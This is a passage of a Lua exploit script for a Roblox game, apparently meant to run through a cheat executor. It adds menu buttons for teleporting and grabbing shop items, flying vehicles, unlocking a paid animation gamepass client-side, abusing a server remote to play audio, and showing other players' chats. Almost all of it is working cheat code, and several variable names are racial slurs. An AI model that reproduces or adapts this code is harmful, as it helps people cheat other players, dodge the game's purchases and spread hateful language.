                until Clicking == false
            end
        end
    end)
end)

local fuckme = MainPage.AddButton("Invisible Mask", function()
    local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
        wait(.2)
        fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
        toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
        toolf.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character:WaitForChild("Mask")
        game:GetService("VirtualUser"):ClickButton1(Vector2.new())
        game.Players.LocalPlayer.Character:WaitForChild("In-gameMask")
        game.Players.LocalPlayer.Character["In-gameMask"].Handle:Destroy()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
    end
end)
local bikeflyernigger = FunstuffPage.AddButton("Bike Fly", function()
	local speed = 20
	local old
	local Plr = game.Players.LocalPlayer
	local wheels = {}
	local control = {q=false,e=false,w=false,a=false,s=false,d=false}
	local Mouse = Plr:GetMouse()

	Mouse.KeyDown:connect(function(KEY)
		local key = KEY:lower()
		if control[key] ~= nil then
			control[key]=true
		end
	end)

	Mouse.KeyUp:connect(function(KEY)
		local key = KEY:lower()
		if control[key] ~= nil then
			control[key]=false
		end
	end)

	while game.RunService.Stepped:wait() do
		local seat = (Plr.Character or Plr.CharacterAdded:wait()):WaitForChild("Humanoid").SeatPart
		if Plr.PlayerGui:FindFirstChild("MainScreenGui") and Plr.PlayerGui.MainScreenGui:FindFirstChild("Bar") and Plr.PlayerGui.MainScreenGui.Bar:FindFirstChild("Speed") then
			Plr.PlayerGui.MainScreenGui.Bar.Speed.bar.Size = UDim2.new(speed / 100 * 0.95, 0, 0.83, 0)
		else
			local c = Plr.PlayerGui.MainScreenGui.Bar.HP
			local g = c:Clone()
			g.Name = "Speed"
			g.Position = UDim2.new(0.5, 0, 1, -120)
			g.bar.BackgroundColor3 = Color3.fromRGB(255, 155, 0)
			g.Picture.Image.Image = "rbxassetid://181035717"
			g.TextLabel.Text = "Speed"
			g.Parent = c.Parent
		end
		if seat ~= nil and seat:IsDescendantOf(game.Workspace.Vehicles) then
			if seat ~= old then
				if old then
					old.Vel:Destroy()
					old.Gyro:Destroy()
				end
				old = seat
				for i = 1, 2 do
					if wheels[i] then
						wheels[i][2].Parent = wheels[i][1]
					end
					local wheel = seat.Parent.Wheel
					wheels[i] = {seat.Parent, wheel}
					wheel:remove()
				end
				local gyro = Instance.new("BodyGyro", seat)
				gyro.Name = "Gyro"
				local pos = Instance.new("BodyVelocity", seat)
				pos.Name = "Vel"
				gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
				pos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
			else 
				seat.Gyro.cframe = workspace.CurrentCamera.CoordinateFrame
				local vel = CFrame.new(0, 0, 0)
				if control.w then
					vel = vel * CFrame.new(0, 0, -speed)
				end
				if control.s then
					vel = vel * CFrame.new(0, 0, speed)
				end
				if control.a then
					vel = vel * CFrame.new(-speed, 0, 0)
				end
				if control.d then
					vel = vel * CFrame.new(speed, 0, 0)
				end
				seat.Vel.Velocity = (seat.CFrame*vel).p - seat.CFrame.p
			end
		end
		if control.e and speed<100 then
			speed = speed + 1
		end
		if control.q and speed > 0 then
			speed = speed - 1
		end
	end
end)
local niggers = FunstuffPage.AddButton("Chat Logs", function()
    local LP = game.Players.LocalPlayer
    LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
    LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
end)

local anti = FunstuffPage.AddButton("Anti-Aim", function()
	local UniversalAnimation = Instance.new("Animation")

	function stopTracks()
		for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
			if (v.Animation.AnimationId:match("rbxassetid")) then
				v:Stop()
			end
		end
	end

	function loadAnimation(id)
		if UniversalAnimation.AnimationId == id then
			stopTracks()
			UniversalAnimation.AnimationId = "1"
		else
			UniversalAnimation.AnimationId = id
			local animationTrack = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation)
			animationTrack:Play()
		end
	end

	while wait() do
		stopTracks()
		loadAnimation("rbxassetid://3152378852")
	end
end)
local SecondButton = FunstuffPage.AddButton("Animation Gamepass", function()
    local Folder = Instance.new('Folder', game:GetService("Workspace"))
    local AnimationPack = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPack
    local ScrollingFrame = AnimationPack.ScrollingFrame
    local CloseButton = AnimationPack.CloseButton

    AnimationPack.Visible = true

    local LeanAnimation = Instance.new("Animation", Folder)
    LeanAnimation.Name = "LeanAnimation"
    LeanAnimation.AnimationId = "rbxassetid://3152375249"
    local Lean = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LeanAnimation)

    local LayAnimation = Instance.new("Animation", Folder)
    LayAnimation.Name = "LayAnimation"
    LayAnimation.AnimationId = "rbxassetid://3152378852"
    local Lay = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LayAnimation)

    local Dance1Animation = Instance.new("Animation", Folder)
    Dance1Animation.Name = "Dance1Animation"
    Dance1Animation.AnimationId = "rbxassetid://3189773368"
    local Dance1 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance1Animation)

    local Dance2Animation = Instance.new("Animation", Folder)
    Dance2Animation.Name = "Dance2Animation"
    Dance2Animation.AnimationId = "rbxassetid://3189776546"
    local Dance2 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance2Animation)

    local GreetAnimation = Instance.new("Animation", Folder)
    GreetAnimation.Name = "GreetAnimation"
    GreetAnimation.AnimationId = "rbxassetid://3189777795"
    local Greet = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GreetAnimation)

    local PrayingAnimation = Instance.new("Animation", Folder)
    PrayingAnimation.Name = "PrayingAnimation"
    PrayingAnimation.AnimationId = "rbxassetid://3487719500"
    local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Lean" then
                v.Name = "LeanButton"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Lay" then
                v.Name = "LayButton"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Dance1" then
                v.Name = "Dance1Button"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Dance2" then
                v.Name = "Dance2Button"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Greet" then
                v.Name = "GreetButton"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Praying" then
                v.Name = "PrayingButton"
            end
        end
    end

    function Stop()
        Lay:Stop()
        Lean:Stop()
        Dance1:Stop()
        Dance2:Stop()
        Greet:Stop()
        Praying:Stop()
    end

    local LeanTextButton = ScrollingFrame.LeanButton
    local LayTextButton = ScrollingFrame.LayButton
    local Dance1TextButton = ScrollingFrame.Dance1Button
    local Dance2TextButton = ScrollingFrame.Dance2Button
    local GreetTextButton = ScrollingFrame.GreetButton
    local PrayingTextButton = ScrollingFrame.PrayingButton

    AnimationPack.MouseButton1Click:Connect(function()
        if ScrollingFrame.Visible == false then
            ScrollingFrame.Visible = true
            CloseButton.Visible = true
        end
    end)
    CloseButton.MouseButton1Click:Connect(function()
        if ScrollingFrame.Visible == true then
            ScrollingFrame.Visible = false
            CloseButton.Visible = false
        end
    end)
    LeanTextButton.MouseButton1Click:Connect(function()
        Stop()
        Lean:Play()
    end)
    LayTextButton.MouseButton1Click:Connect(function()
        Stop()
        Lay:Play()
    end)
    Dance1TextButton.MouseButton1Click:Connect(function()
        Stop()
        Dance1:Play()
    end)
    Dance2TextButton.MouseButton1Click:Connect(function()
        Stop()
        Dance2:Play()
    end)
    GreetTextButton.MouseButton1Click:Connect(function()
        Stop()
        Greet:Play()
    end)
    PrayingTextButton.MouseButton1Click:Connect(function()
        Stop()
        Praying:Play()
    end)

    game:GetService("Players").LocalPlayer.Character.Humanoid.Running:Connect(function()
        Stop()
    end)
    game:GetService("Players").LocalPlayer.Character.Humanoid.Died:Connect(function()
        Stop()
        repeat
            wait()
        until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 100
        wait(1)
        local AnimationPack = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPack
        local ScrollingFrame = AnimationPack.ScrollingFrame
        local CloseButton = AnimationPack.CloseButton

        AnimationPack.Visible = true

        local LeanAnimation = Instance.new("Animation", Folder)
        LeanAnimation.Name = "LeanAnimation"
        LeanAnimation.AnimationId = "rbxassetid://3152375249"
        local Lean = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LeanAnimation)

        local LayAnimation = Instance.new("Animation", Folder)
        LayAnimation.Name = "LayAnimation"
        LayAnimation.AnimationId = "rbxassetid://3152378852"
        local Lay = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LayAnimation)

        local Dance1Animation = Instance.new("Animation", Folder)
        Dance1Animation.Name = "Dance1Animation"
        Dance1Animation.AnimationId = "rbxassetid://3189773368"
        local Dance1 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance1Animation)

        local Dance2Animation = Instance.new("Animation", Folder)
        Dance2Animation.Name = "Dance2Animation"
        Dance2Animation.AnimationId = "rbxassetid://3189776546"
        local Dance2 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance2Animation)

        local GreetAnimation = Instance.new("Animation", Folder)
        GreetAnimation.Name = "GreetAnimation"
        GreetAnimation.AnimationId = "rbxassetid://3189777795"
        local Greet = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GreetAnimation)

        local PrayingAnimation = Instance.new("Animation", Folder)
        PrayingAnimation.Name = "PrayingAnimation"
        PrayingAnimation.AnimationId = "rbxassetid://3487719500"
        local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)

        for i,v in pairs(ScrollingFrame:GetChildren()) do
            if v.Name == "TextButton" then
                if v.Text == "Lean" then
                    v.Name = "LeanButton"
                end
            end
        end

        for i,v in pairs(ScrollingFrame:GetChildren()) do
            if v.Name == "TextButton" then
                if v.Text == "Lay" then
                    v.Name = "LayButton"
                end
            end
        end

        for i,v in pairs(ScrollingFrame:GetChildren()) do
            if v.Name == "TextButton" then
                if v.Text == "Dance1" then
                    v.Name = "Dance1Button"
                end
            end
        end

        for i,v in pairs(ScrollingFrame:GetChildren()) do
            if v.Name == "TextButton" then
                if v.Text == "Dance2" then
                    v.Name = "Dance2Button"
                end
            end
        end

        for i,v in pairs(ScrollingFrame:GetChildren()) do
            if v.Name == "TextButton" then
                if v.Text == "Greet" then
                    v.Name = "GreetButton"
                end
            end
        end

        for i,v in pairs(ScrollingFrame:GetChildren()) do
            if v.Name == "TextButton" then
                if v.Text == "Praying" then
                    v.Name = "PrayingButton"
                end
            end
        end

        function Stop()
            Lay:Stop()
            Lean:Stop()
            Dance1:Stop()
            Dance2:Stop()
            Greet:Stop()
            Praying:Stop()
        end

        local LeanTextButton = ScrollingFrame.LeanButton
        local LayTextButton = ScrollingFrame.LayButton
        local Dance1TextButton = ScrollingFrame.Dance1Button
        local Dance2TextButton = ScrollingFrame.Dance2Button
        local GreetTextButton = ScrollingFrame.GreetButton
        local PrayingTextButton = ScrollingFrame.PrayingButton

        AnimationPack.MouseButton1Click:Connect(function()
            if ScrollingFrame.Visible == false then
                ScrollingFrame.Visible = true
                CloseButton.Visible = true
            end
        end)
        CloseButton.MouseButton1Click:Connect(function()
            if ScrollingFrame.Visible == true then
                ScrollingFrame.Visible = false
                CloseButton.Visible = false
            end
        end)
        LeanTextButton.MouseButton1Click:Connect(function()
            Stop()
            Lean:Play()
        end)
        LayTextButton.MouseButton1Click:Connect(function()
            Stop()
            Lay:Play()
        end)
        Dance1TextButton.MouseButton1Click:Connect(function()
            Stop()
            Dance1:Play()
        end)
        Dance2TextButton.MouseButton1Click:Connect(function()
            Stop()
            Dance2:Play()
        end)
        GreetTextButton.MouseButton1Click:Connect(function()
            Stop()
            Greet:Play()
        end)
        PrayingTextButton.MouseButton1Click:Connect(function()
            Stop()
            Praying:Play()
        end)
    end)
end)
local SecondButton = FunstuffPage.AddButton("Juggernaut", function()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Mouse = LocalPlayer:GetMouse()
    local OriginalKeyUpValue = 0
    
    local Anim = Instance.new("Animation")
    Anim.AnimationId = "rbxassetid://2788838708"
    
    function StopAudio()
        LocalPlayer.Character.LowerTorso.BOOMBOXSOUND:Stop()
    end
    
    function stop(ID, Key)
        local cor = coroutine.wrap(function()
            wait(LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
            if LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
                StopAudio()
            end
        end)
        cor()
    end
    
    function play(ID, STOP, LMAO)
        if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
            local Tool = nil
            if LocalPlayer.Character:FindFirstChildOfClass("Tool") and LMAO == true then
                Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
                LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
            end
            LocalPlayer.Backpack["[Boombox]"].Parent =
                LocalPlayer.Character
            game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
            LocalPlayer.Character["[Boombox]"].RequiresHandle = false
            if LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
                LocalPlayer.Character["[Boombox]"].Handle:Destroy()
            end
            LocalPlayer.Character["[Boombox]"].Parent =
                LocalPlayer.Backpack
            LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
            if Tool ~= true then
                if Tool then
                    Tool.Parent = LocalPlayer.Character
                end
            end
            if STOP == true then
                LocalPlayer.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
                local cor = coroutine.wrap(function()
                    repeat wait() until LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                    OriginalKeyUpValue = OriginalKeyUpValue+1
                    stop(ID, OriginalKeyUpValue)
                end)
                cor()
            end
        end
    end
    
    function Tool()
        local Tool = Instance.new("Tool")
        Tool.Name = "Juggernaut"
        Tool.RequiresHandle = false
        Tool.Activated:Connect(function()
            local Character = LocalPlayer.Character
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    
            function rm()
                for i,v in pairs(Character:GetDescendants()) do
                    if v:IsA("BasePart") or v:IsA("MeshPart") then
                        if v.Name ~= "Head" then
                            for i,cav in pairs(v:GetDescendants()) do
                                if cav:IsA("Attachment") then
                                    if cav:FindFirstChild("OriginalPosition") then
                                        cav.OriginalPosition:Destroy()
                                    end
                                end
                            end
                            for i,v in pairs(v:GetChildren()) do
                                if v.Name == "OriginalSize" then
                                    v:Destroy()
                                end
                            end
                            if v:FindFirstChild("AvatarPartScaleType") then
                                v:FindFirstChild("AvatarPartScaleType"):Destroy()
                            end
                        end
                    end
                end
            end
    
            Humanoid:LoadAnimation(Anim):Play()
            play(862491729, true, true)
            wait(0.4)
            rm()
            Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
            wait(0.2)
    
            rm()
            Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
            wait(0.02)
    
            rm()
            Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
            wait(0.02)
    
            rm()
            Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
            wait(0.02)
        end)
        Tool.Parent = LocalPlayer.Backpack
    end
    Tool()
end)

local SecondButton = FunstuffPage.AddButton("Hearing", function()
    function Hearing()
        function sandbox(var,func)
            local env = getfenv(func)
            local newenv = setmetatable({},{
                __index = function(self,k)
                    if k=="script" then
                        return var
                    else
                        return env[k]
                    end
                end,
            })
            setfenv(func,newenv)
            return func
        end
        cors = {}
        mas = Instance.new("Model",game:GetService("Lighting"))
        Tool0 = Instance.new("Tool")
        LocalScript1 = Instance.new("LocalScript")
        BillboardGui2 = Instance.new("BillboardGui")
        ImageLabel3 = Instance.new("ImageLabel")
        ScreenGui4 = Instance.new("ScreenGui")
        TextLabel5 = Instance.new("TextLabel")
        ScreenGui6 = Instance.new("ScreenGui")
        ImageLabel7 = Instance.new("ImageLabel")
        Tool0.Name = "Hearing"
        Tool0.Parent = mas
        Tool0.CanBeDropped = false
        Tool0.RequiresHandle = false
        LocalScript1.Parent = Tool0
        table.insert(cors,sandbox(LocalScript1,function()
            wait();
            local l__LocalPlayer__1 = game.Players.LocalPlayer;
            while true do
                wait();
                if l__LocalPlayer__1.Character then
                    break;
                end;
            end;
            local l__Character__2 = l__LocalPlayer__1.Character;
            local u1 = false;
            local l__PlayerGui__2 = game.CoreGui;
            function ChatFunc(p1)
                local v3 = p1.Chatted:connect(function(p2)
                    if u1 then
                        local v4 = BrickColor.Random();
                        local v5 = script.MsgGui:Clone();
                        if string.find(string.lower(p2), "super") then
                            v5.Msg.TextSize = 29;
                        end;
                        v5.Msg.Text = p1.Name .. ": " .. p2;
                        v5.Msg.TextColor3 = v4.Color;
                        v5.Msg.Position = UDim2.new(0.5, math.random(-350, 350), 0.5, math.random(-210, 250));
                        v5.Parent = l__PlayerGui__2;
                        local v6 = script.DotGui:Clone();
                        v6.Dot.ImageColor3 = v4.Color;
                        v6.Enabled = true;
                        if p1.Character then
                            if p1.Character:findFirstChild("Head") then
                                v6.Parent = p1.Character.Head;
                            end;
                        end;
                        spawn(function()
                            local v7 = 1 - 1;
                            while true do
                                v6.Size = v6.Size - UDim2.new(0, 1, 0, 1);
                                game:GetService("RunService").RenderStepped:wait();
                                if 0 <= 1 then
                                    if v7 < 70 then
    
                                    else
                                        break;
                                    end;
                                elseif 70 < v7 then
    
                                else
                                    break;
                                end;
                                v7 = v7 + 1;				
                            end;
                        end);
                        game.Debris:AddItem(v5, 3);
                        game.Debris:AddItem(v6, 6);
                    end;
                end);
            end;
            for v8, v9 in pairs(game.Players:GetChildren()) do
                ChatFunc(v9);
            end;
            game.Players.PlayerAdded:connect(function(p3)
                ChatFunc(p3);
            end);
            local u3 = false;
            local u4 = nil;
            script.Parent.Equipped:connect(function(p4)
                p4.Button1Down:connect(function()
                    if u3 then
                        return;
                    end;
                    u3 = true;
                    if not u1 then
                        u4 = script.Frame:Clone();
                        u4.Parent = l__PlayerGui__2;
                        u1 = true;
                    else
                        u4:Destroy();
                        u1 = false;
                    end;
                    wait(1);
                    u3 = false;
                end);
            end);
        end))
        BillboardGui2.Name = "DotGui"
        BillboardGui2.Parent = LocalScript1
        BillboardGui2.Enabled = false
        BillboardGui2.Size = UDim2.new(0, 90, 0, 90)
        BillboardGui2.Active = true
        BillboardGui2.ClipsDescendants = true
        BillboardGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        BillboardGui2.AlwaysOnTop = true
        ImageLabel3.Name = "Dot"
        ImageLabel3.Parent = BillboardGui2
        ImageLabel3.Size = UDim2.new(1, 0, 1, 0)
        ImageLabel3.BackgroundColor = BrickColor.new("Institutional white")
        ImageLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
        ImageLabel3.BackgroundTransparency = 1
        ImageLabel3.Image = "rbxassetid://130424513"
        ImageLabel3.ImageColor3 = Color3.new(1, 0, 0)
        ScreenGui4.Name = "MsgGui"
        ScreenGui4.Parent = LocalScript1
        ScreenGui4.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        TextLabel5.Name = "Msg"
        TextLabel5.Parent = ScreenGui4
        TextLabel5.Position = UDim2.new(0, 300, 0, 25)
        TextLabel5.Size = UDim2.new(0, 1, 0, 1)
        TextLabel5.BackgroundColor = BrickColor.new("Institutional white")
        TextLabel5.BackgroundColor3 = Color3.new(1, 1, 1)
        TextLabel5.BackgroundTransparency = 1
        TextLabel5.Font = Enum.Font.SourceSansBold
        TextLabel5.FontSize = Enum.FontSize.Size28
        TextLabel5.Text = ""
        TextLabel5.TextColor = BrickColor.new("Really black")
        TextLabel5.TextColor3 = Color3.new(0, 0, 0)
        TextLabel5.TextSize = 25
        TextLabel5.TextStrokeTransparency = 0.60000002384186
        ScreenGui6.Name = "Frame"
        ScreenGui6.Parent = LocalScript1
        ScreenGui6.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        ImageLabel7.Name = "Image"
        ImageLabel7.Parent = ScreenGui6
        ImageLabel7.Size = UDim2.new(1, 0, 1, 0)
        ImageLabel7.BackgroundColor = BrickColor.new("Institutional white")
        ImageLabel7.BackgroundColor3 = Color3.new(1, 1, 1)
        ImageLabel7.BackgroundTransparency = 1
        ImageLabel7.Image = "rbxassetid://36869195"
        ImageLabel7.ImageColor3 = Color3.new(0.290196, 1, 0.917647)
        ImageLabel7.ImageTransparency = 0.80000001192093
        for i,v in pairs(mas:GetChildren()) do
            v.Parent = game.Players.LocalPlayer.Backpack
            pcall(function() v:MakeJoints() end)
        end
        mas:Destroy()
        for i,v in pairs(cors) do
            spawn(function()
                pcall(v)
            end)
        end
    end
    game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
    Hearing()
end)
local SecondButton = FunstuffPage.AddButton("Heart", function()
    game.Players.LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.Visible = true
    game.Players.LocalPlayer.PlayerGui:WaitForChild("MainScreenGui"):WaitForChild("Bar"):WaitForChild("HP"):WaitForChild("Picture"):WaitForChild("Life").Visible = true
end)
local SecondButton = FunstuffPage.AddButton("Super Jump (H to toggle, 'Time erase!' to time erase)", function()
    local  MyStand = "DxskTilIDawn"
    local SuperJumpEnabled = false
    
    getgenv().Toggled = false
    local UIS = game:GetService("UserInputService")
    UIS.InputBegan:connect(function(input,gameProcessed)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            if input.KeyCode == Enum.KeyCode.H then
                if UIS:GetFocusedTextBox() == nil then
                    if getgenv().Toggled == false then
                        getgenv().Toggled = true
                    else
                        getgenv().Toggled = true
                    end;end;end;end;end)
    
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Cookies = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
    local OriginalKeyUpValue = 0
    local Anim = Instance.new("Animation" )
    Anim.AnimationId = "rbxassetid://2788290270"
    local Hover = Instance.new("Animation", game.Workspace)
    Hover.Name = "Hover"
    Hover.AnimationId = "rbxassetid://698251653"
    local LeftPunch = Instance.new("Animation",  game.ReplicatedStorage.ClientAnimations)LeftPunch.Name = "LeftPunch"
    LeftPunch.AnimationId = "rbxassetid://2788308661"
    local LeftAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.LeftPunch)
    local CoreUI = Instance.new("ScreenGui")
    local Humanoid = game.Players.LocalPlayer.Character.Humanoid
    CoreUI.Parent = game.CoreGui
    local SaveLocation = nil
    local RigWalk = nil
    local RigIdle = nil
    local InTimeErase = false
    
    local Pointing = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    Pointing.AnimationId = "rbxassetid://507770453"
    
    local UNMASKKK = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    UNMASKKK.Name = "Unmask"
    UNMASKKK.AnimationId = "rbxassetid://3380629232"
    
    local MASKKK = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    MASKKK.Name = "Mask"
    MASKKK.AnimationId = "rbxassetid://3380627692"
    
    local Poter = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(Pointing)
    Poter.Looped = true
    Poter.Priority = Enum.AnimationPriority.Action
    
    local WalkAnimation = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    WalkAnimation.AnimationId = "rbxassetid://2510198475"
    
    local Idle = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
    Idle.AnimationId = "rbxassetid://507766388"
    
    local OldChar = LocalPlayer.Character
    local MaskAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Mask)
    local UnmaskAnim = LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Unmask)
    
    function FoV()
        local fov = coroutine.wrap(function()
            local Camera = workspace.Camera
            for i = 1, 20 do
                game.TweenService:Create(Camera, TweenInfo.new(0.5), {FieldOfView = 8*i}):Play()
                wait(0.01)
            end
            for i = 1, 20 do
                game.TweenService:Create(Camera, TweenInfo.new(0.5), {FieldOfView = 160-i*4.5}):Play()
                wait(0.01)
            end
        end)
        fov()
    end
    
    local WalkSpeed = false
    
    local function rm()
        for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v.Name == "OriginalPosition" then
                v:Destroy()
            elseif v.Name == "OriginalSize" then
                v:Destroy()
            elseif v.Name == "AvatarPartScaleType" then
                v:Destroy()
            end
        end
    end
    
    
    function Lighting()
        if game.Lighting:FindFirstChild("ERASE") == nil then
            local sound5 = Instance.new("Sound", CoreUI)
            sound5.Volume = 0.1
            sound5.Name = "ERASE"
            sound5.Looped = true
            sound5.SoundId = "rbxassetid://3167092959"
            sound5:Play()
    
            game.Lighting.Sky.Parent = workspace
            game:GetObjects("rbxassetid://6546113226")[1].Parent=game.Lighting
    
        else
            workspace.Sky.Parent = game.Lighting
            CoreUI:FindFirstChild("ERASE"):Destroy()
            game.Lighting:FindFirstChild("ERASE"):Destroy()
        end
    end
    
    function TimeEraseUI()
        local sound5 = Instance.new("Sound", CoreUI)
        sound5.Volume = 0.1
        sound5.SoundId = "rbxassetid://6546128175"
        sound5:Play()
    
        local Image = Instance.new("ImageLabel", CoreUI)
        Image.Image = "http://www.roblox.com/asset/?id=6546043746"
        Image.BackgroundTransparency = 1
        Image.AnchorPoint = Vector2.new(0.5, 0.5)
        Image.Size = UDim2.fromScale(1, 1)
        Image.Position = UDim2.fromScale(-0.5, 0.5)
        delay(0, function()
            for i = 0, 1, 0.1 do
                Image.Position = UDim2.fromScale(-Image.Position.X.Scale+i, 0.5)
                Image.ImageTransparency = Image.ImageTransparency+i
                wait(.01)
            end
            Image:Destroy()
            sound5:Destroy()
        end)
    end
    
    
    function ModelCharacter()
        if workspace:FindFirstChild(LocalPlayer.Name.."StringKOD") == nil then
            local MODEL = Instance.new("Model", workspace)
            MODEL.Name = LocalPlayer.Name.."StringKOD"
    
            OldChar.Humanoid:UnequipTools()
    
            for i, v in pairs(OldChar:GetChildren()) do 
                if (v:IsA("BasePart")  or v:IsA("MeshPart")) and v.Parent:FindFirstChildOfClass("Humanoid") and v.Name ~= "HumanoidRootPart" then
                    local Part = v:Clone()
                    Part.Parent = MODEL
                    Part.Name = v.Name
                    Part.Material = Enum.Material.ForceField
                    Part.CFrame = v.CFrame
                    Part.Transparency = 0.5 
                    Part.BrickColor = BrickColor.Red()
                    Part.CanCollide = false
                    Part.Anchored = true
                    for i, v  in pairs(Part:GetChildren()) do 
                        if v.ClassName ~= "SpecialMesh" then
                            v:Destroy()
                        end
                    end
                end
            end
            local NewCharacter = game:GetObjects("rbxassetid://6547055500")[1]
            NewCharacter.Parent = MODEL
            NewCharacter.Name = "Idaro"
    
            workspace.Camera.CameraSubject = NewCharacter.Humanoid
            SaveLocation = OldChar.HumanoidRootPart.CFrame
            InTimeErase = true
            NewCharacter.HumanoidRootPart.CFrame = SaveLocation
    
            RigIdle = NewCharacter:WaitForChild("Humanoid"):LoadAnimation(Idle)
            RigIdle.Looped = true
            RigIdle.Priority = Enum.AnimationPriority.Action
            RigWalk = NewCharacter:WaitForChild("Humanoid"):LoadAnimation(WalkAnimation)
            RigWalk.Looped = true
            RigWalk.Priority = Enum.AnimationPriority.Action
            WalkSpeed = true
            RigIdle:Play()
        else
            InTimeErase = false
            WalkSpeed = false
            workspace.Camera.CameraSubject =  OldChar.Humanoid
            OldChar.HumanoidRootPart.CFrame =  workspace:FindFirstChild(LocalPlayer.Name.."StringKOD").Idaro.HumanoidRootPart.CFrame
            workspace:FindFirstChild(LocalPlayer.Name.."StringKOD"):Destroy()
        end
    end
    
    function Slide()
        local XD = OldChar.Humanoid:LoadAnimation(Anim)
        XD:Play()
        XD.TimePosition = 0.15
        XD.Looped = false
        XD:AdjustSpeed(1.1)
    end
    
    function AddVelocity(Vel, Char)
        Char.HumanoidRootPart.Velocity = Char.HumanoidRootPart.Velocity+Vel
    end
    
    local IsJump = false
    
    function Jumping()
        if IsJump == false then
            return false
        else
            return true
        end
    end
    
    local Mouse = LocalPlayer:GetMouse()
    
    local MoveDirection = Vector3.new(0,0,0)
    local WSpped = 0 
    local LeftSpeed = 0
    local UpSpeed = 0
    
    function IdleRigXD()
        if RigIdle and RigWalk.IsPlaying and WSpped == 0 and LeftSpeed == 0 and UpSpeed == 0 then
            RigIdle:Play()
            RigWalk:Stop()
        end
    end
    
